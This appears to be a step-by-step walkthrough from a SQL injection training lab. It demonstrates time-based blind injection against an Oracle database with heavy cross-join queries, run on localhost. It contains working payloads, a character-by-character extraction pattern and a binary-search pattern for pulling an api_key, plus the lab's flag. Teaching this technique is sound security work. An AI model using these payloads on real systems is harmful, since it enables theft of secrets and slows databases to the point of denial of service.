<h4>Step 1: Confirm True Blind Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Identical Responses</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab8" \<br> --data-urlencode "sid=abc123"<br>
        <span class="prompt">Input: </span>abc123<br>
        <span class="prompt">SQL: </span>SELECT username FROM sessions WHERE session_id = 'abc123'<br>
        <span class="prompt">Result: </span><strong>Session check complete.</strong> Valid sessions are automatically extended.<br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "sid=' OR 1=1 -- "<br>
        <span class="prompt">Input: </span>' OR 1=1 -- <br>
        <span class="prompt">Result: </span><strong>Session check complete.</strong> (same response -- true blind)
    </div>
</div>

<h4>Step 2: Test Heavy Query Delay</h4>
<p>
    When <code>DBMS_PIPE</code> is unavailable, Cartesian joins on system views like
    <code>ALL_OBJECTS</code> create measurable delays. This technique requires no special privileges.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Heavy Query Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s "..." --data-urlencode "sid=abc123" -o /dev/null<br>
        <span class="prompt">Baseline: </span>~335ms<br><br>
        <span class="prompt">$ </span>time curl -s "..." \<br>
        &nbsp;&nbsp;--data-urlencode "sid=' OR (SELECT COUNT(*) FROM all_objects,all_objects WHERE ROWNUM&lt;=50000)>0 -- " -o /dev/null<br>
        <span class="prompt">Result: </span><strong>~53540ms delay!</strong> (over 53 seconds for 50000 cross-join rows)<br>
        <span class="prompt">// Cross-joining ALL_OBJECTS with itself creates millions of rows -- tune ROWNUM to control delay</span>
    </div>
</div>

<h4>Step 3: Conditional Heavy Query (Tested)</h4>
<p>
    Combine <code>CASE WHEN</code> with the heavy query to create a conditional delay.
    TRUE condition triggers the expensive cross-join; FALSE skips it.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Conditional Delay</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">True:  </span>' OR (SELECT CASE WHEN 1=1 THEN<br>
        &nbsp;&nbsp;(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM&lt;=20000)<br>
        &nbsp;&nbsp;ELSE 0 END FROM DUAL) > 0 -- <br>
        <span class="prompt">Result: </span>~25846ms delay (condition TRUE, heavy query runs)<br><br>
        <span class="prompt">False: </span>' OR (SELECT CASE WHEN 1=2 THEN<br>
        &nbsp;&nbsp;(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM&lt;=20000)<br>
        &nbsp;&nbsp;ELSE 0 END FROM DUAL) > 0 -- <br>
        <span class="prompt">Result: </span>~5913ms (condition FALSE -- Oracle still evaluates subquery due to optimizer)<br><br>
        <span class="prompt">Note: </span>Oracle may not fully optimize away CASE in all versions. Embed<br>
        the condition inside the cross-join's WHERE clause for more reliable conditional delay.
    </div>
</div>

<h4>Step 4: Extract Flag Character by Character (Verified)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Character Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s "..." \<br>
        &nbsp;&nbsp;--data-urlencode "sid=' OR (SELECT CASE WHEN SUBSTR(api_key,1,1)='F' THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM&lt;=10000) ELSE 0 END FROM api_keys WHERE ROWNUM&lt;=1) > 0 -- " -o /dev/null<br><br>
        <span class="prompt">Pattern: </span>' OR (SELECT CASE WHEN SUBSTR(api_key,N,1)='X' THEN<br>
        &nbsp;&nbsp;(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM&lt;=10000)<br>
        &nbsp;&nbsp;ELSE 0 END FROM api_keys WHERE ROWNUM&lt;=1) > 0 -- <br><br>
        <span class="prompt">Pos 1:  </span>X='F' -> ~20640ms delay (TRUE)<br>
        <span class="prompt">Pos 2:  </span>X='L' -> delay (TRUE)<br>
        <span class="prompt">Pos 3:  </span>X='A' -> delay (TRUE)<br>
        <span class="prompt">...     </span>(continue for all characters)<br><br>
        <span class="prompt">Result: </span><strong>FLAG{or_h34vy_qu3ry_t1m3}</strong>
    </div>
</div>

<h4>Step 5: Binary Search with ASCII</h4>
<p>
    Use <code>ASCII(SUBSTR(...))</code> with &gt;/&lt; comparisons to halve the search space
    each request (~7 requests per character instead of ~36).
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Binary Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' OR (SELECT CASE WHEN ASCII(SUBSTR(api_key,5,1))>100 THEN<br>
        &nbsp;&nbsp;(SELECT COUNT(*) FROM all_objects,all_objects WHERE ROWNUM&lt;=500000)<br>
        &nbsp;&nbsp;ELSE 0 END FROM api_keys WHERE ROWNUM&lt;=1) > 0 -- <br>
        <span class="prompt">Result: </span>Delay = ASCII > 100, No delay = ASCII &lt;= 100<br><br>
        <span class="prompt">// Tuning: Adjust ROWNUM limit to control delay duration</span><br>
        <span class="prompt">// 500000 rows ~= 5-8 sec, 100000 ~= 1-2 sec</span>
    </div>
</div>

<h4>Step 6: DBMS_PIPE vs Heavy Query Comparison</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Technique Comparison</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">DBMS_PIPE:   </span>Precise delay, requires EXECUTE privilege<br>
        <span class="prompt">Heavy Query: </span>Variable delay, NO privileges needed<br>
        <span class="prompt">DBMS_LOCK:   </span>PL/SQL only, requires DBA grant<br><br>
        <span class="prompt">Heavy query sources:</span><br>
        <span class="prompt">  ALL_OBJECTS x ALL_OBJECTS: </span>~15 sec (millions of rows)<br>
        <span class="prompt">  ALL_OBJECTS x ALL_TABLES:  </span>~3 sec (fewer rows)<br>
        <span class="prompt">  WITH ROWNUM&lt;=N:            </span>tunable delay
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_h34vy_qu3ry_t1m3}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Heavy queries (Cartesian joins on <code>ALL_OBJECTS</code>) provide
    a time-based blind injection technique that requires <strong>no special privileges</strong>.
    The delay comes from the database engine processing millions of rows in a cross-join.
    Adjust <code>ROWNUM &lt;= N</code> to control delay duration. This works on any Oracle installation,
    unlike <code>DBMS_PIPE</code> which needs explicit grants. Defense: use bind variables, implement
    query timeouts, and limit access to data dictionary views.
</div>
